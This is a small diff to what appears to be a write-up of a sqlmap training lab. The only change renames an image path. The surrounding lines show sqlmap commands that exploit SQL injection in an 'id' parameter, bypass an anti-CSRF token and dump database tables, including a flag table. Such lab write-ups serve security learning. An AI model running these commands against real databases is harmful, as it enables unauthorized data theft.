@@ -139,7 +139,7 @@ sqlmap -r case1.req --batch -p 'id' -dbms MySQL -D testdb -T users --columns -C 
 >What's the contents of table flag8? (Case #8)
 >Detect and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection (Note: non-standard token name is used)
 
-![sqlmap-csrf-token-bypass](/IMAGES/sqlmap-csrf-token-bypass.png)  
+![sqlmap csrf token bypass](/images/sqlmap-csrf-token-bypass.png)  
 
 ```
 sqlmap -r case8.req --batch -p "id" --csrf-token="t0ken" -dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast
